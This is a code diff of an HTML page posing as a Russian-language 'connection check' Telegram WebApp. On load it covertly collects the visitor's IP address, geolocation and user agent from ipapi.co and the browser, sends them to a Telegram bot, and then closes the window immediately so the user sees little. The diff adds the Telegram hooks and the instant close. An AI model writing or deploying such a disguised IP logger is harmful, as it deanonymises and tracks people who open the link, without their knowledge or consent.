@@ -3,8 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <title>Проверка соединения</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Это ВАЖНО -->
   <script>
     async function sendData() {
+      const tg = window.Telegram.WebApp;
+      tg.ready(); // уведомляем Telegram, что WebApp готов
+
       const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
       const userAgent = navigator.userAgent;
 
@@ -17,7 +21,8 @@
         ua: userAgent
       };
 
-      Telegram.WebApp.sendData(JSON.stringify(payload));
+      tg.sendData(JSON.stringify(payload));
+      tg.close(); // Закрываем окно сразу после отправки
     }
 
     window.onload = sendData;
